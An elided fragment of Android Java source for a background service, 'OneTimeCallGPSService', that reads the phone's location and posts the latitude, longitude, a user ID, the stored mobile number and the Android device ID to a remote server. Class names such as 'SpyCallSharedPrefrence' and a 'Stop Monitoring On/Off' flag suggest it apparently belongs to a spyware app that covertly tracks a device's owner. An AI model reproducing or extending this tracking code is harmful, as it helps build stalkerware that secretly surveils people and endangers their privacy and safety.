...
public class OneTimeCallGPSService extends Service implements LocationListener,
		...
		if (servicesConnected()) {
			startPeriodicUpdates();								
	          ...
	          if (currentLocation != null) { 
	        	  ...
	        	  if(Utility.isNetworkAvailable(OneTimeCallGPSService.this)){
					//****Stop Monitoring On/Off
	        		  if(SpyCallSharedPrefrence.getOneTimeGPS(OneTimeCallGPSService.this).equals("true"))
						{
	        			  SpyCallSharedPrefrence.saveOneTimeGPS(OneTimeCallGPSService.this, "false");						
  ...
  class GPSTrackTasknew extends AsyncTask<Double, Void, Void> {
		...
		protected Void doInBackground(Double... params) {        
			...
			try{
				...
				stopPeriodicUpdates();////////////
				String getDeviceIDString=SpyCallSharedPrefrence.getsaveDEVICEID_Pre(OneTimeCallGPSService.this);				
				//String getUserID_SP = SpyCallSharedPrefrence.getsaveUSER_ID(OneTimeCallGPSService.this);	
				String getUserID_SP = HinjAppPreferenceUtils.getRaId(OneTimeCallGPSService.this);
				String android_id = Secure.getString(OneTimeCallGPSService.this.getContentResolver(),Secure.ANDROID_ID);
				...
				String getResponceLatLong=RequestPostClass.postLatLongPost(latitude,longitude,getUserID_SP,
						SpyCallSharedPrefrence.getsaveMOBILE_NO(OneTimeCallGPSService.this),android_id);
